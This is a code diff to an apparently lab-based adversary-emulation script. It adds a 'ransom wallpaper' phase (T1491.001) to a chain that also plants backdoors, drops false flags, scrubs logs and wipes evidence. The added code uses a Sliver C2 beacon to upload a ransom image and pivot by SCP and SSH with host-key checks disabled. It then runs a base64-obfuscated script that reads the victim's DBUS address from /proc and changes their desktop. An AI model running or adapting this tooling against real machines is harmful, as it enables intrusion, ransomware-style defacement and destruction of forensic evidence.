@@ -143,6 +143,14 @@ SHRED_PASSES        = 3       # `shred -n 3` overwrite count
 FREE_SPACE_FILL_MB  = 64      # /tmp free-space wipe (small to stay under 30 s)
 
 # =============================================================================
+# Constants — Phase 5 ransom wallpaper (T1491.001)
+# =============================================================================
+
+# kali bind-mount path → target path on john_ws (ubuntu_workstation)
+WALLPAPER_KALI_SRC = "/Attack-chain/payloads/ran_wall.jpg"
+WALLPAPER_REMOTE   = "/tmp/ran_wall.jpg"
+
+# =============================================================================
 # Helpers
 # =============================================================================
 
@@ -686,6 +694,70 @@ def _phase4_secure_wipe(root_sliver_session: str,
 # Public entrypoint
 # =============================================================================
 
+# =============================================================================
+# Phase 5 — Ransom wallpaper (T1491.001 Internal Defacement)
+# =============================================================================
+
+def _phase5_set_ransom_wallpaper(vinzenz_beacon: str) -> bool:
+    """Upload ran_wall.jpg kali → vinzenz_ws → john_ws; set XFCE4 wallpaper.
+
+    Access path: sliver upload → vinzenz_ws /tmp, then SCP vinzenz→john_ws,
+    then SSH to john_ws to run xfconf-query as john.stravidis on DISPLAY=:1.
+    The VNC session on localhost:5901 will show the ransom note immediately.
+    Returns True on confirmed success, False otherwise (non-fatal).
+    """
+    import os
+    log("\n[*] ── Phase 5: T1491.001 — setting ransom wallpaper on ubuntu_workstation ──")
+
+    if not os.path.exists(WALLPAPER_KALI_SRC):
+        log(f"[-] Wallpaper image not found at {WALLPAPER_KALI_SRC} — skipping")
+        return False
+
+    try:
+        sliver_upload(vinzenz_beacon, WALLPAPER_KALI_SRC, WALLPAPER_REMOTE)
+        log(f"[+] Uploaded {WALLPAPER_KALI_SRC} → vinzenz_ws:{WALLPAPER_REMOTE}")
+    except Exception as exc:
+        log(f"[-] sliver_upload failed: {exc} — skipping wallpaper")
+        return False
+
+    scp_cmd = (
+        f"execute -o -- scp -o StrictHostKeyChecking=no "
+        f"-o UserKnownHostsFile=/dev/null "
+        f"{WALLPAPER_REMOTE} john:{WALLPAPER_REMOTE}"
+    )
+    sliver_exec(vinzenz_beacon, scp_cmd, timeout=20)
+    log(f"[+] SCP'd wallpaper to john_ws:{WALLPAPER_REMOTE}")
+
+    # Set wallpaper as john.stravidis (DISPLAY=:1). Read DBUS address from
+    # the live xfce4-session process env; fall back to the XDG socket path.
+    wallpaper_script = (
+        "JOHN_UID=$(id -u john.stravidis); "
+        "DBUS_ADDR=$(cat /proc/$(pgrep -u john.stravidis -x xfce4-session 2>/dev/null"
+        " | head -1)/environ 2>/dev/null | tr '\\0' '\\n'"
+        " | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-); "
+        '[ -z "$DBUS_ADDR" ] && DBUS_ADDR="unix:path=/run/user/${JOHN_UID}/bus"; '
+        f"runuser -u john.stravidis -- env DISPLAY=:1 "
+        f'DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
+        f"xfconf-query -c xfce4-desktop "
+        f"-p /backdrop/screen0/monitor0/workspace0/last-image "
+        f"-s {WALLPAPER_REMOTE} 2>/dev/null || true; "
+        "pkill -USR1 -u john.stravidis xfdesktop 2>/dev/null || true; "
+        "echo WALLPAPER_OK"
+    )
+    b64_wp = base64.b64encode(wallpaper_script.encode()).decode()
+    ssh_cmd = (
+        f"execute -o -- sh -c "
+        f"'ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null john "
+        f"\"echo {b64_wp} | base64 -d | sh\" 2>/dev/null || true'"
+    )
+    out = sliver_exec(vinzenz_beacon, ssh_cmd, timeout=25)
+    if out and "WALLPAPER_OK" in out:
+        log("[+] Ransom wallpaper set on ubuntu_workstation (VNC :5901) ✓")
+        return True
+    log("[-] Wallpaper command did not confirm — may not have applied")
+    return False
+
+
 def run(
     root_sliver_session: str,
     vinzenz_beacon: str,
@@ -769,6 +841,15 @@ def run(
     except Exception as exc:
         log(f"[!] phase 4 (secure wipe) failed: {exc}")
 
+    # Phase 5: ransom wallpaper — runs AFTER wipe so the wallpaper image is
+    # still on kali (it's never wiped from there). Best-effort; failure is
+    # non-fatal and logged.
+    wallpaper_ok = False
+    try:
+        wallpaper_ok = _phase5_set_ransom_wallpaper(vinzenz_beacon)
+    except Exception as exc:
+        log(f"[!] phase 5 (ransom wallpaper) failed: {exc}")
+
     log("\n[+] Advanced Cleanup + Backdoor complete.")
     log(f"    backdoors:      {len(backdoors_installed)} planted")
     log(f"    false flags:    {len(false_flags_dropped)} dropped")
@@ -777,6 +858,7 @@ def run(
     if bury_evidence:
         log(f"    evidence:       {evidence_buried['pg_queries']} pg queries + "
             f"{evidence_buried['nflog_flows']} nflog flows added")
+    log(f"    ransom wallpaper: {'set' if wallpaper_ok else 'skipped/failed'}")
 
     return {
         "backdoors_installed":  backdoors_installed,
@@ -784,5 +866,6 @@ def run(
         "logs_scrubbed":        logs_scrubbed,
         "artifacts_wiped":      artifacts_wiped,
         "evidence_buried":      evidence_buried,
+        "wallpaper_set":        wallpaper_ok,
         "cleanup_self_path":    None,  # inline commands — no script to self-delete
     }
